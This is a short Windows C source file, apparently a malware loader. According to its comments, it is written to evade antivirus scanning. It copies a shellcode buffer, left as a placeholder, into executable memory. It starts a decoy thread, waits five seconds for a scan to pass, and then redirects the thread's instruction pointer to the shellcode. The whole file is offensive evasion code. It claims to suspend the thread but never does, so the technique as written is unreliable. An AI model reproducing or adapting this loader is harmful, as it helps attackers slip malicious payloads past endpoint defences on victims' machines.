#include <windows.h>

/* 
* Here we will be creating a new thread under 
* a process with some benign funcion/routine
* then, we will suspend this thread some time 
* to prevent that the AV scan detect shellcode,
* after that time, we will be changing the 
* context of the thread to point to our shellcode
* hopping that the av scan has done before
*/

void nothing() {
  // This is the function that we will be using
  // on the call routine
};

int main() {
  unsigned char shellcode[] = "...";

  LPVOID hMemory =
      VirtualAlloc(NULL,              // We dont care where it is located on
                   sizeof(shellcode), // Size of mem to reserve
                   MEM_COMMIT | MEM_RESERVE, // Type of memory location
                   PAGE_EXECUTE_READWRITE    // Mem protection
      );

  // Write onto memory
  SIZE_T bytesWritten = 0;
  WriteProcessMemory(GetCurrentProcess(), // handle to the target process
                     hMemory,             // handle to target mem region
                     &shellcode,          // pointer to data to write
                     sizeof(shellcode),   // size of data to write
                     &bytesWritten // receives the number of bytes written
  );

  DWORD threadId = 0;
  HANDLE hThread = CreateThread(
      NULL, 0,
      (LPTHREAD_START_ROUTINE)nothing, // Pointer to the empty function
      NULL, 0,
      &threadId // Receives the new thread id
  );

  Sleep(5 * 1000);

  // Get thread context
  CONTEXT ctx = {0};
  ctx.ContextFlags = CONTEXT_ALL;

  GetThreadContext(hThread, &ctx);

  // Point thread context at shellcode
  ctx.Rip = (DWORD64)hMemory;
  SetThreadContext(hThread, &ctx);

  // Resume the thread
  ResumeThread(hThread);

  // Wait to finish
  WaitForSingleObject(hThread, INFINITE);

  // Close handle
  CloseHandle(hThread);
}
